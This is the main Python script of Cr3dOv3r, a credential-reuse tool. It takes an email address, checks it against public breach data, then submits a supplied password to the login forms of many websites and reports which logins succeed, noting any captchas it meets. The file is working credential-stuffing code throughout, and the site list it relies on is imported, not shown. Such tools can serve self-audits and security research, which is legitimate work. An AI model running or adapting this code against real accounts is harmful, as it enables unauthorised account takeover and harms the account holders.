#Written by: Karim shoair - D4Vinci ( Cr3dOv3r )
# -*- coding: utf-8 -*-
import os,argparse,requests,signal
from getpass import getpass
import mechanicalsoup as ms
from Core import ispwned
from Core.utils import *
from Core.color import *

def signal_handler(signal, frame):
	print(end+'\n')
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(prog='Cr3d0v3r.py')
parser.add_argument("email", help="Email/username to check")
parser.add_argument("-p",action="store_true", help="Don't check for leaks or plain text passwords.")
parser.add_argument("-np",action="store_true", help="Don't check for plain text passwords.")
parser.add_argument("-q",action="store_true", help="Quiet mode (no banner).")
args    = parser.parse_args()
email   = args.email

def is_there_captcha(page_source):
	# Got these words from the recaptcha api docs Muhahahaha
	if any( w in page_source.lower() for w in ["recaptcha/api","grecaptcha"]):
		return True
	return False

#with mechanicalsoup
def login( name ,dic ,email ,pwd ):
	url ,form,e_form ,p_form = dic["url"] ,dic["form"],dic["e_form"] ,dic["p_form"]
	browser = ms.StatefulBrowser()
	try:
		browser.open(url)
	except:
		error("[{:10s}] Couldn't even open the page! Do you have internet !?".format(name))
		return

	if is_there_captcha(browser.get_current_page().text):
		error("[{:10s}] Found captcha on page loading!".format(name))
		return

	try:
		browser.select_form(form)
		browser[e_form] = email
		browser[p_form] = pwd
		browser.submit_selected()
	except ms.utils.LinkNotFoundError:
		error("[{:10s}] Something wrong with the website maybe it's blocked!".format(name))
		return

	if is_there_captcha(browser.get_current_page().text):
		error("[{:10s}] Found captcha after submitting login page!".format(name))
		return
	#Now let's check if it was success by trying to use the same form again and if I could use it then the login not success
	try:
		browser.select_form(form)
		browser.close()
		error("[{:10s}] Login unsuccessful!".format(name))
	except ms.utils.LinkNotFoundError:
		browser.close()
		status("[{:10s}] Login successful!".format(name))

#websites that use two forms to login
def custom_login( name ,dic ,email ,pwd ):
	url ,form1,form2,e_form ,p_form = dic["url"] ,dic["form1"],dic["form2"],dic["e_form"] ,dic["p_form"]
	browser = ms.StatefulBrowser()
	try:
		browser.open(url)
	except:
		error("[{:10s}] Couldn't even open the page! Do you have internet !?".format(name))
		return

	if is_there_captcha(browser.get_current_page().text):
		error("[{:10s}] Found captcha on page loading!".format(name))
		return

	try:
		browser.select_form(form1)
		browser[e_form] = email
	except ms.utils.LinkNotFoundError:
		error("[{:10s}] Something wrong in parsing, maybe it displayed captcha!".format(name))
		return

	try:
		browser.submit_selected()
		browser.select_form(form2)
		browser[p_form] = pwd
		browser.submit_selected()
	except ms.utils.LinkNotFoundError:
		browser.close()
		error("[{:10s}] Email not registered!".format(name))
		return

	if is_there_captcha(browser.get_current_page().text):
		error("[{:10s}] Found captcha after submitting login page!".format(name))
		return
	#Now let's check if it was success by trying to use the same form again and if I could use it then the login not success
	try:
		browser.select_form(form2)
		browser.close()
		error("[{:10s}] Login unsuccessful!".format(name))
	except:
		browser.close()
		status("[{:10s}] Login successful!".format(name))
	#That's a lot of exceptions :"D

#Login to websites with post requests
def req_login( name ,dic ,email ,pwd ):
	url ,verify,e_form ,p_form = dic["url"] ,dic["verify"],dic["e_form"] ,dic["p_form"]
	data  = {e_form:email,p_form:pwd}
	req = requests.post(url,data=data).text
	if is_there_captcha(req):
		error("[{:10s}] Found captcha on page loading!".format(name))
		return
	#Now let's check if it was success by trying to find the verify words and if I could find them then login not successful
	if any( word in req for word in verify):
		error("[{:10s}] Login unsuccessful!".format(name))
		return
	status("[{:10s}] Login successful!".format(name))

def main():
	if not args.q:
		banner()
	if not args.p:
		status("Checking email in public leaks...")
		ispwned.parse_data(email,args.np)

	print(C+" │"+end)
	line =C+" └──=>Enter a password"+W+"─=> "
	if os.name=="nt":
		pwd   = getinput(line) #Escaping the echo warning, sorry guyss (¯\_(ツ)_/¯)
	else:
		pwd   = getpass(line)

	print("")
	status("Testing email against {} website".format( Y+str(len(all_websites))+G ))
	for wd in list(websites.keys()):
		dic = websites[wd]
		login( wd ,dic ,email ,pwd )

	for wd in list(custom_websites.keys()):
		dic = custom_websites[wd]
		custom_login( wd ,dic ,email ,pwd )

	for wd in list(req_websites.keys()):
		dic = req_websites[wd]
		req_login( wd ,dic ,email ,pwd )

if __name__ == '__main__':
	main()
